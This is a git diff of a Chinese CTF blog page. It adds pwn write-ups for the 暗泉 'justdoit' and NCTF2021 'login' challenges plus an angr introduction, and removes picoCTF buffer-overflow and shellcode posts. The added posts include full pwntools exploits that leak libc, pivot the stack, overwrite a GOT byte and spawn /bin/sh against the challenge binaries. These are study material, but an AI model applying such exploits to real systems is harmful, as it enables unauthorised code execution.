@@ -155,6 +155,257 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/" class="post-title-link" itemprop="url">2021暗泉-justdoit</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-23 23:38:37" itemprop="dateCreated datePublished" datetime="2022-02-23T23:38:37+08:00">2022-02-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-24 00:25:18" itemprop="dateModified" datetime="2022-02-24T00:25:18+08:00">2022-02-24</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>首先看看题目，main函数如下</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/main.png" class>
+
+<p>read_long() 函数如下</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/read_long.jpg" class>
+
+<p>题目给的两处输入都没有溢出，但仔细观察main函数的汇编会发现有这个</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-1.jpg" class>
+
+<p>因为read_long()函数中用到了 atol() 函数将我们的输入的字符串转化为整型，且这个函数的返回值就是转化后的整型值，显然 read_long() 函数加上红线汇编就起到让我们任意控制 rbp 的值，间接让我们控制了返回地址。同时因为main函数中的局部变量 buf[32] 并没有被初始化，我们就可以利用第一个输入在栈上布置返回地址，但是其只允许我们输入 0x18 个字节，也就是最多一次布置3条返回地址，但是因为我们首先需要泄漏libc，所以我们需要多次返回main函数完成ROP的布置以及泄漏，需要布置如下ROP：</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-2.jpg" class>
+
+<p>那么我们第一次如下输入</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-3.jpg" class>
+
+<p>然后将 rbp 拉到 rsp 的位置</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-4.png" class>
+
+<p>leave_ret之后</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-5.png" class>
+
+<p>再次执行到main函数的第一个read时的栈</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-6.png" class>
+
+<p>由此完成泄漏ROP的布置</p>
+<img src="/2022/02/23/2021%E6%9A%97%E6%B3%89-justdoit/%E5%88%86%E6%9E%90-7.jpg" class>
+
+<p>其实这部分很简单，简单分析下函数调用就完了，再往后getshell部分重复即可</p>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./justdoit&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./justdoit&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4011D5</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x04012b3</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x4011D5&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(main)*<span class="number">3</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">40</span>))</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">sys = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(main)*<span class="number">3</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">32</span>))</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name? &quot;</span>,p64(pop_rdi) + p64(binsh) + p64(sys))</span><br><span class="line">p.sendafter(<span class="string">&quot;frends??&quot;</span>,<span class="built_in">str</span>(-<span class="number">40</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/22/ret2-libcsyscall/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/22/ret2-libcsyscall/" class="post-title-link" itemprop="url">ret2_libcsyscall</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-02-22 02:25:04 / 修改时间：03:03:16" itemprop="dateCreated datePublished" datetime="2022-02-22T02:25:04+08:00">2022-02-22</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>以 2.27 的 libc 版本为例，在如下函数的某处偏移中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;read + 15&gt;		syscall</span><br><span class="line">&lt;write + 18&gt;	syscall</span><br><span class="line">&lt;open64 + 76&gt;	syscall</span><br><span class="line">&lt;alarm + 5&gt;		syscall</span><br><span class="line">&lt;close + 18&gt;	syscall</span><br></pre></td></tr></table></figure>
+
+<p>这些函数的这些位置调用的就是<code>syscall</code>这个指令，如果能将某些函数的got修改为这些函数的这些位置就得到了syscall指令，而且由于 ASLR 对 libc 的随机化不会影响其最低12位（即最低3位16进制数），所以有时候当某个函数的 got 表跟其函数内部的 syscall 指令地址只有一个字节相差的时候，我们可以直接修改掉最低一字节即可，连爆破都不用。（好像都是只差一个字节）</p>
+<p>这个方法可以用在当我们需要构造 syscall 而程序中没有现存的 syscall 指令的时候。</p>
+<h3 id="2021NCTF-login"><a href="#2021NCTF-login" class="headerlink" title="2021NCTF-login"></a>2021NCTF-login</h3><p>例行保护</p>
+<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-checksec.jpg" class>
+
+<p>程序主逻辑如下</p>
+<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-main.png" class>
+
+<p>程序很简单，只有一个 0x10 字节长度的溢出，所以当然想到栈迁移到 .bss 段继续我们的构造。同时因为关闭了标准输出和标准错误输出，所以无法泄漏内存。</p>
+<p>那么我们自然会想到，如果无法泄漏内存的话只能我们手动makecall，那么一定会需要 syscall 指令，可惜程序中没有现存的 syscall 指令，那么我们尝试在已经调用了的函数中寻找。</p>
+<img src="/2022/02/22/ret2-libcsyscall/%E2%91%A0-libcsyscall.jpg" class>
+
+<p>可以看到在 close 函数的 +21 处就是一条 syscall 指令，而且 close 函数在 main 函数中已经调用过，所以我们可以利用 read 函数直接修改其 got 表最低一字节，由此得到一条 syscall 指令。</p>
+<p>由此我们确定思路：将栈迁移到 .bss 段，同时在上面写好我们的ROP，①需要在已知地址写入’/bin/sh‘作参数。②需要修改 close 函数的 got 表得到 syscall 指令。③ makecall调用execve。</p>
+<p>细节慢慢调即可，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line"></span><br><span class="line">csu_addr = <span class="number">0x40128A</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">call_addr,rdi,rsi,rdx</span>):</span></span><br><span class="line">	payload = p64(<span class="number">0</span>)  <span class="comment">#rbx</span></span><br><span class="line">	payload += p64(<span class="number">1</span>) <span class="comment">#rbp</span></span><br><span class="line">	payload += p64(rdi) <span class="comment">#r12</span></span><br><span class="line">	payload += p64(rsi) <span class="comment">#r13</span></span><br><span class="line">	payload += p64(rdx) <span class="comment">#r14</span></span><br><span class="line">	payload += p64(call_addr) <span class="comment">#r15</span></span><br><span class="line">	payload += p64(<span class="number">0x401270</span>) <span class="comment">#ret</span></span><br><span class="line">	payload += p64(<span class="number">1</span>) <span class="comment">#padding</span></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line">read = <span class="number">0x4011ED</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span> + p64(bss + <span class="number">0x300</span>) + p64(read)</span><br><span class="line">p.sendafter(<span class="string">&quot;Welcome to NCTF2021!&quot;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#write to bss+0x200</span></span><br><span class="line">payload = p64(<span class="number">0x40128A</span>) + csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,elf.got[<span class="string">&#x27;close&#x27;</span>],<span class="number">1</span>)</span><br><span class="line">payload += csu(elf.got[<span class="string">&#x27;read&#x27;</span>],<span class="number">0</span>,bss+<span class="number">0x400</span>,<span class="number">59</span>)</span><br><span class="line">payload += csu(elf.got[<span class="string">&#x27;close&#x27;</span>],bss+<span class="number">0x400</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(bss+<span class="number">0x1f8</span>) + p64(<span class="number">0x40121F</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">&quot;\x85&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">59</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/13/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C-%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6angr/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/13/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C-%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90%E6%A1%86%E6%9E%B6angr/" class="post-title-link" itemprop="url">符号执行-基于python的二进制分析框架angr</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-13 20:14:30" itemprop="dateCreated datePublished" datetime="2022-02-13T20:14:30+08:00">2022-02-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-16 22:48:57" itemprop="dateModified" datetime="2022-02-16T22:48:57+08:00">2022-02-16</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h4><p>[一篇比较好的文章](<a href="https://github.com/chyyuu/symexe/blob/master/klee_document/klee_analysis.md">symexe/klee_analysis.md at master · chyyuu/symexe · GitHub</a>)</p>
+<p>如果仅学习如何使用angr框架的话其实不需要对符号执行有过多了解，所以这里只做简单概述，更详细的地方可以看上面的文章。</p>
+<blockquote>
+<p>符号执行是指在不执行实际程序的前提下，把源程序翻译为一种中间语言，用符号值表示程序变量的值，然后基于中间语言模拟程序执行来进行相关分析的技术，它可以分析代码的所有语义信息，也可以只分析部分语义信息（如只分析“内存是否释放”这一部分的语义信息）。</p>
+<p>程序的路径（path）是程序的一个语句序列，这个语句序列包括程序的一些顺序的代码片段，代码片段之间的连接是由于分支语句导致的控制转移。一个路径是可行的（feasible），是指存在程序输入变量的至少一组值，如果以这组值作为输入，程序将沿着这条路径执行。否则，路径就是不可行的（infeasible）。路径条件（path condition,PC）是针对一个路径的，它是一个关于程序输入变量的符号值的约束，一组输入值使得程序沿着这条路径执行当且仅当这组输入值满足这条路径的路径条件。</p>
+</blockquote>
+<p>例如某个程序在执行过程中会执行如下语句</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> password[<span class="number">9</span>];</span><br><span class="line"><span class="keyword">char</span> *sneaky = <span class="string">&quot;SOSNEAKY&quot;</span>;</span><br><span class="line">read(<span class="number">0</span>, password, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(password, sneaky) == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>显然在这条 if 分支语句处程序的执行路径就可以分成两条，分别对应 strcmp 函数的比较结果。同时显然至少存在一组值（”SOSNEAKY“）能使得这条分支语句中存在可行路径。</p>
+<h4 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h4><p><a target="_blank" rel="noopener" href="https://docs.angr.io/">官方手册</a></p>
+<p>angr的作用就在于能够得出上述的使得程序走”可行路径“的”至少一组值“。</p>
+<p>要注意的是符号执行的路径选择问题到现在依旧是一个很大的问题，换句话说也就是当我们的程序存在循环时，因为符号执行会尽量遍历所有的路径，所以每次循环之后会形成至少两个分支，当循环的次数足够多时，就会造成路径爆炸，整个机器的内存会被耗尽。</p>
+<p>我们以下面的例子来学习如何使用angr</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/02/13/pwntools/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -945,307 +1196,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/picoctf-2018-buffer-overflow-0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/17/picoctf-2018-buffer-overflow-0/" class="post-title-link" itemprop="url">picoctf_2018_buffer_overflow_0</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-17 21:21:53" itemprop="dateCreated datePublished" datetime="2021-12-17T21:21:53+08:00">2021-12-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-18 15:18:44" itemprop="dateModified" datetime="2021-12-18T15:18:44+08:00">2021-12-18</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><ol>
-<li><p>signal() 函数：signal ( 参数1，参数2 )，参数1：要进行处理的信号。参数2：处理的方式。</p>
-<p>关于系统信号可以在终端输入 <code>kill -l</code> 查看，如下</p>
-</li>
-<li><p>main(int argc,char *argv[]) ，argc 和 argv[] 为命令行参数</p>
-<p>① argc为整数，表示由操作系统传来的参数（也是传入main函数的参数）的个数</p>
-<p>② argv[] 为指针数组，其存储着指向由操作系统传来的参数（也是传入main函数的参数）的地址的指针</p>
-<p>③argc最小为 1，因为 argv[0] 正常情况下存储程序的名称，并且包含了程序所在的完整路径。</p>
-<p>例子：</p>
-<p>假如程序的名称为 guess：则当我们输入 <code>./guess</code> 时，argc = 1，表示由操作系统传来的参数只有一个，argv[0] 指向输入的程序路径及名称 “./guess”</p>
-<p>当我们输入 <code>./guess 123</code> 时，argc = 2，表示由操作系统传来的参数由两个，argv[0] 指向输入的程序路径及名称，argv[1] 指向第二个参数 “123” 字符串的地址。</p>
-</li>
-</ol>
-<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>题目提示要用ssh登入，但我们先下载程序文件做完分析工作</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/ssh-1.jpg" class>
-
-<p>例行检查保护</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/checksec.jpg" class>
-
-<p>main函数如下</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/main.png" class>
-
-<p>注意到 signal() 函数，我们查看 sigsegv_handler() 函数</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/sigsegv_handler.jpg" class>
-
-<p>所以如果我们触发了11号系统信号就直接能获得 flag 了，我们在终端输入 <code>kill -l</code> 查看系统信号</p>
-
-
-<blockquote>
-<p>引用百度百科关于11号系统信号的介绍：</p>
-<p>在POSIX兼容的平台上，<strong>SIGSEGV</strong>是当一个进程执行了一个无效的内存引用，或发生<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%AE%B5%E9%94%99%E8%AF%AF/7896410">段错误</a>时发送给它的信号。SIGSEGV的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%AC%A6%E5%8F%B7%E5%B8%B8%E9%87%8F/1666578">符号常量</a>在头文件signal.h中定义。因为在不同平台上，信号数字可能变化，因此符号信号名被使用。通常，它是信号#11。</p>
-</blockquote>
-<p>所以只要我们只要让程序执行一个无效的内存引用即可。</p>
-<p>程序没有给输入函数，但是 vuln() 函数将 argv[1] 作为参数，说明我们需要在命令行中传入我们的输入作为参数。我们查看 vuln() 函数</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/vuln.jpg" class>
-
-<p>可以看到这里存在栈溢出漏洞，那么只要我们输入直到覆盖栈上的返回地址为一个无效值即可让 signal() </p>
-<p>函数执行 sigsegv_handler() 函数打印出flag了。</p>
-<p>ssh连上： <code>ssh -p 28312 CTFMan@node4.buuoj.cn</code> </p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/ssh-2.png" class>
-
-
-
-<p>同理，其实我们也可以不依靠 sigsegv_handler() 函数，只要我们覆盖返回地址来调用 puts() 函数，再把 flag 所在地址作为参数，同样也可以打印出flag。</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/puts.jpg" class>
-
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/flag.png" class>
-
-<p>所以payload = ‘a’*0x1c + \xC0\x84\x04\x08 + \x00\x00\x00\x00 + \x80\xA0\x04\x08</p>
-<img src="/2021/12/17/picoctf-2018-buffer-overflow-0/ssh-4.jpg" class>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/17/shellcode/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/17/shellcode/" class="post-title-link" itemprop="url">shellcode</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-17 20:22:47" itemprop="dateCreated datePublished" datetime="2021-12-17T20:22:47+08:00">2021-12-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-13 17:03:17" itemprop="dateModified" datetime="2022-03-13T17:03:17+08:00">2022-03-13</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6645#toc-5">shellcode 的艺术 - 先知社区 (aliyun.com)</a></p>
-<p>这篇文章主要用来收集做题时关于shellcode的问题</p>
-<h4 id="mrctf2020-shellcode-revenge"><a href="#mrctf2020-shellcode-revenge" class="headerlink" title="mrctf2020_shellcode_revenge"></a>mrctf2020_shellcode_revenge</h4><p>该题利用 alpha3 来生成可见字符shellcode来绕过限制，详细见：<a target="_blank" rel="noopener" href="http://taqini.space/2020/03/31/alpha-shellcode-gen/#alpha3">纯字符shellcode生成指南 | TaQini</a></p>
-<p>程序保护如下，栈段是可执行的</p>
-<img src="/2021/12/17/shellcode/msr_checksec.jpg" class>
-
-<p>该题的main函数无法反汇编，所以就着汇编审</p>
-<img src="/2021/12/17/shellcode/msr_main.jpg" class>
-
-<p>可以看到开辟了 0x410 个字节的栈空间，然后往 buf 处输入最多 0x400 个字节，所以没有溢出。然后将 rax 的值与0进行比较，即将 read() 读取的字节数与0进行比较 ，如果大于0则跳转到 <code>loc_11AC</code>，否则跳转到 <code>locret_1254</code></p>
-<img src="/2021/12/17/shellcode/msr_11AC.jpg" class>
-
-<img src="/2021/12/17/shellcode/msr_1254.jpg" class>
-
-<p>可见<code>locret_1254</code> 用来结束程序，<code>loc_11AC</code> 处将0赋给 var_4 之后跳转到 <code>loc_123A</code> ,如下</p>
-<img src="/2021/12/17/shellcode/msr_123A.jpg" class>
-
-<p>可以看到此处将 var_4 和 var_8 进行比较，若 var_4 小于 var_8 则跳转到 <code>loc_11B8</code> 处，由前文我们知道 var_4 为0，var_8 一定大于0，所以这里会进行跳转。</p>
-<img src="/2021/12/17/shellcode/msr_11B8.jpg" class>
-
-<img src="/2021/12/17/shellcode/msr_11FC.jpg" class>
-
-<p>从 11B8-12AC 这一段汇编我们可以知道其是检查我们的输入是否在 <code>(60,74)||(2f,5a)</code>(大概）的范围里，如果不是则跳转到 1254 处结束程序，如果符合则跳转到 1236 处将 var_4 +1 以此进入一个循环，直到将我们的输入的每一位都检查完后会在 123A 处 <code>call rax</code> 也就是执行我们的输入，到这里我们的思路就很明确了，只要我们输入一段满足其输入限制的shellcode 就可以了。然后用 alpha3 生成即可</p>
-<h4 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" class="headerlink" title="starctf_2019_babyshell"></a>starctf_2019_babyshell</h4><p>main() 函数如下</p>
-<img src="/2021/12/17/shellcode/sbs_main.jpg" class>
-
-<p>sub_400786() 函数如下</p>
-<img src="/2021/12/17/shellcode/sbs_400786.jpg" class>
-
-<p>可见在 main() 函数中我们可以直接往用 mmap 开辟出来的一段空间中写入一段内容，最后会直接执行这段内容，显然我们可以直接输入shellcode来getshell。但在执行前 sub_400786() 函数对我们的输入进行检查，即输入的每一位都必须是 unk_400978 中的字符，我们查看 unk_400978 中的内容</p>
-<img src="/2021/12/17/shellcode/sbs_400978.jpg" class>
-
-<p>显然我们想直接构造出符合条件的shellcode是比较困难的，但是如果可以让shellcode的前面加上 ‘\x00’ 开头的一段机器码，且这段机器码不会影响shellcode的执行，那么就可以pass掉整段检查过程。可用的机器码有 <code>\x00B\x22</code>、<code>\x00B\x00</code> 等</p>
-<p>exp如下：</p>
